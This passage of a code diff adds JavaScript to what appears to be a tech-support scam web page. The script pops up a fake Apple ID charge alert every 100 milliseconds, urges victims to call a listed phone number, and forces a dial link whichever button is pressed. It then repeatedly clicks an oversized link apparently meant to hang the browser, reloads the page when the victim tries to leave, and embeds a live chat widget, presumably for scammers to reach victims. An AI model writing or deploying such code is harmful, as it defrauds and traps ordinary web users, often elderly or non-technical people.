+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-833-497-3169"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-833-497-3169 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
